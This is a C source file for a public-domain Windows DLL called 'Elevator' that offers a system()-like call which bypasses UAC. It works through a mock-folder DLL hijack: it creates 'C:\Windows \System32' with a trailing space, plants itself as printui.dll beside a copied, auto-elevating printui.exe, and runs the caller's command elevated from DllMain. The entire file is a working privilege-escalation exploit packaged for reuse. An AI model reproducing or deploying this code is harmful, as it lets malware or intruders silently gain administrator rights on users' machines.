/*
 * Elevator - It's like system(3) but it bypasses UAC
 *
 * This is free and unencumbered software released into the public domain.
 *
 * Anyone is free to copy, modify, publish, use, compile, sell, or distribute
 * this software, either in source code form or as a compiled binary, for any
 * purpose, commercial or non-commercial, and by any means.
 *
 * In jurisdictions that recognize copyright laws, the author or authors of this
 * software dedicate any and all copyright interest in the software to the
 * public domain. We make this dedication for the benefit of the public at large
 * and to the detriment of our heirs and successors. We intend this dedication
 * to be an overt act of relinquishment in perpetuity of all present and future
 * rights to this software under copyright law.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
 * WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#include <stdlib.h>
#include <string.h>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

#define _ELEVATOR_INTERNAL
#include <elevator.h>

static int setUpEnvironment() {
    // Look up path to the loaded DLL file
    HMODULE module;
    WCHAR filename[MAX_PATH];
    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR) &elevator, &module) == FALSE) {
        return 1;
    }
    if (GetModuleFileNameW(module, filename, MAX_PATH) == FALSE) {
        return 1;
    }

    // Create the mock system folders
    if (CreateDirectoryW(L"\\\\?\\C:\\Windows \\", NULL) == FALSE) {
        return 1;
    }
    if (CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32\\", NULL) == FALSE) {
        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
        return 1;
    }

    // Copy the loaded DLL file into the mock System32 folder under the name printui.dll for hijacking
    if (CopyFileW(filename, L"\\\\?\\C:\\Windows \\System32\\printui.dll", TRUE) == FALSE) {
        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32\\");
        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
        return 1;
    }

    // Copy the real printui.exe file into the mock System32 folder next to the fake printui.dll file
    // This particular EXE is one of several that automatically elevates itself without presenting UAC dialog
    if (CopyFileW(L"C:\\Windows\\System32\\printui.exe", L"\\\\?\\C:\\Windows \\System32\\printui.exe", TRUE) == FALSE) {
        DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\printui.dll");
        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32\\");
        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
        return 1;
    }

    return 0;
}

static int tearDownEnvironment() {
    // Delete the copy of printui.exe and the fake printui.dll
    if (DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\printui.exe") == FALSE) {
        return 1;
    }
    if (DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\printui.dll") == FALSE) {
        return 1;
    }

    // Delete the mock system folders
    if (RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32\\") == FALSE) {
        return 1;
    }
    if (RemoveDirectoryW(L"\\\\?\\C:\\Windows \\") == FALSE) {
        return 1;
    }

    return 0;
}

int elevator(const char* command) {
    // Set up the elevation environment
    if (setUpEnvironment()) {
        return 1;
    }

    // Allocate and build the full command line string
    const char* commandPrefix = "cmd /c C:\\Windows\" \"\\System32\\printui.exe ";
    const char* commandSuffix = command;
    command = strcat((char*) realloc(_strdup(commandPrefix), strlen(commandPrefix) + strlen(commandSuffix) + 1), commandSuffix);

    // Aaaaaaand run it...
    system(command);

    // Deallocate full command line string
    free(command);

    // Tear down the elevation environment
    return tearDownEnvironment();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH: {
            // A string to search for to see if we're in the elevated surrogate process
            const char magic[] = "\"C:\\Windows \\System32\\printui.exe\" ";

            // The full command line string of this process
            const char* cmdline = GetCommandLineA();

            // If we just attached to the elevated surrogate process
            if (memcmp(cmdline, magic, sizeof magic - 1) == 0) {
                // We are elevated, so slice off and execute the user's command string!
                system(&cmdline[sizeof magic]);
            }

            return TRUE;
        }
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            return TRUE;
    }
}
